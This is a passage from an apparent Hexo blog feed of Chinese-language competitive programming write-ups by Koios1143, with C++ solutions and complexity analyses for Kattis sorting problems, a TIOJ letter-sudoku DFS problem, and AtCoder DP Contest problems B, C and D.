<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> arr[<span class="number">20010</span>];</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sort(arr, arr+n);</span><br><span class="line">	<span class="keyword">bool</span> possible=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n<span class="number">-2</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr[i] + arr[i+<span class="number">1</span>] &gt; arr[i+<span class="number">2</span>])&#123;</span><br><span class="line">			possible=<span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(possible) <span class="built_in">cout</span>&lt;&lt;<span class="string">"possible\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"impossible\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>輸入時間複雜度為 $O(n)$</p>
<p>排序時間複雜度為 $O(nlogn)$</p>
<p>遍歷時間複雜度為 $O(n)$</p>
<p>總時間複雜度為 $O(n + nlogn)$</p>
]]></content>
      <categories>
        <category>Kattis</category>
      </categories>
      <tags>
        <tag>Kattis</tag>
        <tag>Sort</tag>
      </tags>
  </entry>
  <entry>
    <title>Kattis - Sideways Sorting</title>
    <url>/2021/03/23/Kattis%20Sideways%20Sorting/</url>
    <content><![CDATA[<h1 id="Kattis-Sideways-Sorting"><a href="#Kattis-Sideways-Sorting" class="headerlink" title="Kattis - Sideways Sorting"></a>Kattis - Sideways Sorting</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://open.kattis.com/problems/sidewayssorting" target="_blank" rel="noopener">https://open.kattis.com/problems/sidewayssorting</a></p>
<p>一般來說我們排序字串都是由左到右，但是本題要我們由上到下來看</p>
<p>輸入第一行包含兩個正整數 $r, c$，表示 row 與 column</p>
<p>接下來有 $r$ 行，每行 $c$ 個字元</p>
<p>最後輸出垂直方向由上到下的<strong>穩定排序</strong></p>
<p>並且排序過程當中忽略大小寫</p>
<p>舉例來說</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">oTs</span><br><span class="line">nwi</span><br><span class="line">eox</span><br></pre></td></tr></table></figure>

<p>從垂直的方向來看，我們會得到三個字串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">one</span><br><span class="line">Two</span><br><span class="line">six</span><br></pre></td></tr></table></figure>

<p>接下來排序這幾個字串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">one</span><br><span class="line">six</span><br><span class="line">Two</span><br></pre></td></tr></table></figure>

<p>最後排回原本的橫向</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">osT</span><br><span class="line">niw</span><br><span class="line">exo</span><br></pre></td></tr></table></figure>

<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為排序的方向是垂直的，我們可以直接以垂直的方式儲存這些字串即可</p>
<p>接下來穩定排序過後在改變輸出的方向即可</p>
<p>至於排序的部分，我們可以先把所有要比較的字串先都轉換成小寫之後再來比較大小</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> arr[<span class="number">20</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="built_in">string</span> p, <span class="built_in">string</span> q)</span></span>&#123;</span><br><span class="line">	<span class="comment">// 先轉換成小寫 </span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;p.size() ; i++)&#123;</span><br><span class="line">		p[i] = <span class="built_in">tolower</span>(p[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;q.size() ; i++)&#123;</span><br><span class="line">		q[i] = <span class="built_in">tolower</span>(q[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 接下來再比較大小 </span></span><br><span class="line">	<span class="keyword">if</span>(p != q) <span class="keyword">return</span> p&lt;q;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r,c;</span><br><span class="line">	<span class="keyword">char</span> tmp;</span><br><span class="line">	<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;r&gt;&gt;c &amp;&amp; (r!=<span class="number">0</span> &amp;&amp; c!=<span class="number">0</span>))&#123;</span><br><span class="line">		<span class="comment">// 輸出之間需要有換行 </span></span><br><span class="line">		<span class="keyword">if</span>(out) <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> out=<span class="literal">true</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 初始化所有字串 </span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;c ; i++)&#123;</span><br><span class="line">			arr[i] = <span class="string">""</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;r ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">				<span class="comment">// 把字串串起來</span></span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">				arr[j]+=tmp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		stable_sort(arr, arr+c, cmp);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;r ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">				<span class="comment">// 記得輸出方向是相反</span></span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;arr[j][i];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入時間複雜度為 $O(rc)$</p>
<p>每筆測資初始化時間複雜度為 $O(rc)$</p>
<p>每筆測資排序時間複雜度為 $O((len(p) + len(q)) \times nlogn)$</p>
<p>每筆測資輸出時間複雜度為 $O(rc)$</p>
<p>每筆測資總時間複雜度約為 $O(rc + nlogn)$ ($len(p) + len(q)$ 很小，可以忽視)</p>
]]></content>
      <categories>
        <category>Kattis</category>
      </categories>
      <tags>
        <tag>Kattis</tag>
        <tag>Sort</tag>
      </tags>
  </entry>
  <entry>
    <title>Kattis - Synchronizing Lists</title>
    <url>/2021/03/23/Kattis%20Synchronizing%20Lists/</url>
    <content><![CDATA[<h1 id="Kattis-Synchronizing-Lists"><a href="#Kattis-Synchronizing-Lists" class="headerlink" title="Kattis - Synchronizing Lists"></a>Kattis - Synchronizing Lists</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://open.kattis.com/problems/synchronizinglists" target="_blank" rel="noopener">https://open.kattis.com/problems/synchronizinglists</a></p>
<p>給定兩個序列，$A$, $B$，題目希望我們能將序列 $B$ 排序，使得 $B$ 的元素排列順序和 $A$ 是相同的</p>
<p>輸入包含少於 100 筆測試資料，每筆資料包含一個正整數 $n$</p>
<p>接下來會有 $2n$ 行，前 $n$ 行表示序列 $A$ 的元素，後 $n$ 行表示序列 $B$ 的元素</p>
<p>輸出排列順序與 $A$ 相同的新序列 $B’$</p>
<p>$1 \leq n \leq 5000 \quad -10000 \leq \texttt{每個元素的值} \leq 10000$</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>要知道 $B$ 序列應該要怎麼排序，就必須要先知道 $A$ 序列是怎麼排序的</p>
<p>但是如果我們已經知道序列 $A$ 的每個元素應該分別要對應到序列 $B$ 的哪個元素，那我們就找到 $B’$ 了</p>
<p>舉例來說: $A = (48, 10, 97) \quad B = (7, 46, 20)$</p>
<p>如果我們已經先知道 $10 \rightarrow 7 \quad 48 \rightarrow 20 \quad 97 \rightarrow 46$</p>
<p>那麼我們的答案 $B’$ 就顯而易見了 $B’ = (7, 20, 46)$</p>
<p>要找到 $A$ 的每個元素要對應到 $B$ 的哪個元素是很容易的</p>
<p>我們只要將 $A, B$ 分別由小到大排序，相對應位置上的元素就是了</p>
<p>最後再對應回原本的序列 $A$ 就有 $B’$ 了</p>
<p>詳細來說，我們的步驟會是這樣:</p>
<ol>
<li>輸入</li>
<li>將序列 $A$ 複製一份叫做 $A’$</li>
<li>將 $A’$ 以及 $B$ 由小到大排序</li>
<li>製作一份表格，將每個 $A$ 的元素對應到 $B$ 的元素</li>
<li>按照 $A$ 的順序，輸出新序列 $B’$</li>
</ol>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">// tmp 是複製 fir 陣列用</span></span><br><span class="line">	<span class="comment">// tbl 陣列是對應用的表格</span></span><br><span class="line">	<span class="keyword">int</span> n, fir[<span class="number">5005</span>], sec[<span class="number">5005</span>], tmp[<span class="number">5005</span>], tbl[<span class="number">20010</span>];</span><br><span class="line">	<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(out) <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> out=<span class="literal">true</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;fir[i];</span><br><span class="line">			tmp[i] = fir[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;sec[i];</span><br><span class="line">		&#125;</span><br><span class="line">		sort(tmp, tmp+n);</span><br><span class="line">		sort(sec, sec+n);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="comment">// 因為數值範圍包含負數，所以統一加上 10000 避免負數</span></span><br><span class="line">			tbl[tmp[i]+<span class="number">10000</span>] = sec[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="comment">// 記得要將 10000 加上去</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;tbl[fir[i]+<span class="number">10000</span>]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入時間複雜度為 $O(n)$</p>
<p>每筆測資排序時間複雜度為 $O(nlogn)$</p>
<p>每筆測資輸出時間複雜度為 $O(n)$</p>
<p>每筆測資總時間複雜度約為 $O(n + nlogn)$</p>
]]></content>
      <categories>
        <category>Kattis</category>
      </categories>
      <tags>
        <tag>Kattis</tag>
        <tag>Sort</tag>
      </tags>
  </entry>
  <entry>
    <title>TIOJ1235</title>
    <url>/2020/09/21/TIOJ1235/</url>
    <content><![CDATA[<h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://tioj.ck.tp.edu.tw/problems/1235" target="_blank" rel="noopener">https://tioj.ck.tp.edu.tw/problems/1235</a><br>同數獨問題不過元素改成 $R O Y G B I P L W$<br>問空格應填入甚麼元素</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>記錄每行、每列、每個九宮格有哪些元素已經被使用<br>接著DFS每個空著的元素，枚舉是否有可能是答案</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">9</span>][<span class="number">9</span>],new_arr[<span class="number">9</span>][<span class="number">9</span>],input,var[<span class="number">9</span>]=&#123;<span class="string">'R'</span>,<span class="string">'O'</span>,<span class="string">'Y'</span>,<span class="string">'G'</span>,<span class="string">'B'</span>,<span class="string">'I'</span>,<span class="string">'P'</span>,<span class="string">'L'</span>,<span class="string">'W'</span>&#125;;</span><br><span class="line"><span class="keyword">bool</span> used_rect[<span class="number">9</span>][<span class="number">128</span>];</span><br><span class="line"><span class="keyword">bool</span> used_row[<span class="number">9</span>][<span class="number">128</span>];</span><br><span class="line"><span class="keyword">bool</span> used_col[<span class="number">9</span>][<span class="number">128</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;pii&gt; emp;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_rect</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x&lt;<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(y&lt;<span class="number">3</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(y&lt;<span class="number">6</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(x&lt;<span class="number">6</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(y&lt;<span class="number">3</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(y&lt;<span class="number">6</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(y&lt;<span class="number">3</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(y&lt;<span class="number">6</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(emp.empty())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">int</span> x,y;</span><br><span class="line">	tie(x,y)=emp.back();</span><br><span class="line">	emp.pop_back();</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">9</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!used_rect[get_rect(x,y)][var[i]] &amp;&amp; !used_row[y][var[i]] &amp;&amp; !used_col[x][var[i]])&#123;</span><br><span class="line">			new_arr[x][y]=var[i];</span><br><span class="line">			used_rect[get_rect(x,y)][var[i]] = used_row[y][var[i]] = used_col[x][var[i]] = <span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">if</span>(dfs()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			used_rect[get_rect(x,y)][var[i]] = used_row[y][var[i]] = used_col[x][var[i]] = <span class="literal">false</span>;</span><br><span class="line">			new_arr[x][y]=<span class="string">'*'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	emp.emplace_back(x,y);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">9</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">9</span> ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;input;</span><br><span class="line">			arr[i][j]=input;</span><br><span class="line">			<span class="keyword">if</span>(input==<span class="string">'*'</span>)&#123;</span><br><span class="line">				emp.emplace_back(i,j);</span><br><span class="line">			&#125;</span><br><span class="line">			used_rect[get_rect(i,j)][input]=<span class="literal">true</span>;</span><br><span class="line">			used_row[j][input]=<span class="literal">true</span>;</span><br><span class="line">			used_col[i][input]=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	dfs();</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">9</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">9</span> ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[i][j] == <span class="string">'*'</span>)</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;new_arr[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>輸入複雜度為 $O(n^2)$ </br><br>DFS複雜度最差為 $O(9^{n^{2}})$ ，但是實際上因為有剪枝，加上空格數量問題，所以實際上會比這個小很多很多</p>
]]></content>
      <categories>
        <category>TIOJ</category>
      </categories>
      <tags>
        <tag>TIOJ</tag>
        <tag>DFS</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pD</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pD/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pD"><a href="#Atcoder-DP-Contest-pD" class="headerlink" title="Atcoder DP Contest pD"></a>Atcoder DP Contest pD</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_d" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_d</a><br>有一個負重上限為 $w$ 的背包<br>有 $n$ 個物品，每個物品都有其重量及價值<br>求能放入背包內的最大價值為何</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於每個物品查看用該物品能組出的重量分別能形成的價值為多少並不斷更新<br>定義 $DP[i][j]$ 表示在前 $i$ 物中最大負重為 $j$ 時的最大價值<br>則可得轉移式 $DP[i][j] = max(DP[i-1][j], DP[i-1][j-cost[i]]+value[i])$<br>且為了避免取同物品多次的狀況，最大負重從 $w$ 開始往下算<br>不過在實作上可以發現到每次取的都是 $i-1$ 的狀態，所以實際上可以壓縮成一維</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">105</span>,MaxW = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> n,w,cost[MaxN],value[MaxN];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[MaxW];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;w)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;cost[i]&gt;&gt;value[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=w ; j-cost[i]&gt;=<span class="number">0</span> ; j--)&#123;</span><br><span class="line">				dp[j] = max(dp[j], dp[j-cost[i]]+value[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dp[w]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $w$ 種狀態，每種狀態轉移複雜度為 $O(n)$<br>總複雜度 $O(wn)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
        <tag>Backpack</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pB</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pB/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pB"><a href="#Atcoder-DP-Contest-pB" class="headerlink" title="Atcoder DP Contest pB"></a>Atcoder DP Contest pB</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_b" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_b</a></p>
<p>對於每個點 $i$ 可以從點 $i-1, i-2, … , i-k$ 轉移<br>而轉移的花費為 $\mid arr[i]-arr[i-k] \mid$<br>求到點 $n$ 的最小花費</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於每種轉移方式求最大值<br>定義 $DP[i]$ 表示點 $i$ 的最小花費<br>則有轉移式 $DP[i] = min(DP[i], DP[i-k] + \mid arr[i]-arr[i-k] \mid)$<br>且 $DP[0] = 0, DP[1]=abs(arr[0]-arr[1])$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MaxN = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> n,k,arr[MaxN],dp[MaxN];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">			dp[i]=INT_MAX;</span><br><span class="line">		&#125;</span><br><span class="line">		dp[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span> ; i-j&gt;=<span class="number">0</span> &amp;&amp; j&lt;=k ; j++)&#123;</span><br><span class="line">				dp[i]=min(dp[i], dp[i-j] + <span class="built_in">abs</span>(arr[i]-arr[i-j]));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dp[n<span class="number">-1</span>]&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $n$ 種狀態，每種狀態轉移複雜度為 $O(k)$<br>總複雜度 $O(nk)$</p>
]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pC</title>
    <url>/2020/06/26/Atcoder%20DP%20Contest%20pC/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pC"><a href="#Atcoder-DP-Contest-pC" class="headerlink" title="Atcoder DP Contest pC"></a>Atcoder DP Contest pC</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_c" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_c</a><br>每天都有三種活動可以選擇，且有各自價值<br>本次選擇的活動與上次選擇的不能相同，求第 $n$ 天的最大價值總和</p>
